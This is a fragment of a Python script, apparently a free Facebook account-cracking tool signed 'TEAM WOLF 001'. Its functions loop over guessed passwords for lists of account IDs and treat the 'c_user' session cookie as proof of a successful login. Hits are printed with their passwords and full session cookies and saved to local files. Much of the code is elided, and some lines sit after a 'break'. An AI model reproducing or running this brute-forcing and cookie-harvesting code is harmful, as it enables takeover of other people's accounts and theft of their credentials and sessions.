...
(_   )( ___)( ___)  (  _ \(  _ \  /__\  ( \( )(  _ \ 
 / /_  )__)  )__)    ) _ < )   / /(__)\  )  (  )(_) )
(____)(____)(____)  (____/(_)\_)(__)(__)(_)\_)(____/ 

--------------------------------------
 [*] Author   : TEAM WOLF 001
 [*] GitHub   : TEAM WOLF 001
 [*] TOOL     : FREE
 [*] Version  : 0.1
--------------------------------------""")
    ...
    for pw in pwv:
        try:
            ...
            if 'c_user' in ses.cookies.get_dict():
                ...
                coki=ses.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\33[92m[WOLF-001-OK] {idf}|{pw} | {kuki}')
                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
                break
            else:
                continue
...
def crack2(idf,pwv,nmf):
    global loop,ok,cp
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r {P}[WOLF-001] {loop}|{len(id)} [OK:-{ok}]  | {U}{'{:.0%}'.format(loop/float(len(id)))}{P} "),
    sys.stdout.flush()
    for pw in pwv:
        try:
            ...
            if 'c_user' in ses.cookies.get_dict():
                print(f'\r\33[91m[WOLF-001-CP] {idf}|{pw} | {kuki}')
                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
                akun.append(idf+'|'+pw)
                cp+=1
                break
                ...
                coki=ses.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\33[92m[WOLF-001-CP] {idf}|{pw} | {kuki}')
                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
                break
            else:
                continue
